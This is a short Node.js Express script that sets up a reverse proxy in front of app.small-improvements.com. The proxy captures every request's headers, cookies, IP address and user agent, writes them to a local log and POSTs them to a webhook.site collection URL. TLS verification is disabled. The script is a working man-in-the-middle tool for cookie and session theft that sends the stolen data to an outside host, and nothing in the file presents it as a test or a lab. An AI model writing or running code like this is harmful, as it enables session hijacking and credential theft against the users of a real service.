const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs');
const app = express();

// Webhook URL
const WEBHOOK_URL = 'https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310';

// Store captured data
app.use(express.json());

// Capture ALL requests
app.use('*', (req, res, next) => {
    const captureData = {
        timestamp: new Date().toISOString(),
        method: req.method,
        url: req.originalUrl,
        headers: req.headers,
        cookies: req.headers.cookie,
        host: req.headers.host,
        userAgent: req.headers['user-agent'],
        ip: req.ip
    };

    console.log('CAPTURED REQUEST:', captureData);
    
    // Send to webhook
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(captureData)
    }).catch(console.error);

    // Log to file
    fs.appendFileSync('captured.log', JSON.stringify(captureData) + '\n');
    
    next();
});

// Proxy everything
app.use('/', createProxyMiddleware({
    target: 'https://app.small-improvements.com',
    changeOrigin: true,
    secure: false,
    onProxyReq: (proxyReq, req, res) => {
        console.log('Proxying:', req.method, req.originalUrl);
    }
}));

app.listen(8080, () => {
    console.log('Proxy server running on http://localhost:8080');
    console.log('Configure browser to use this proxy!');
});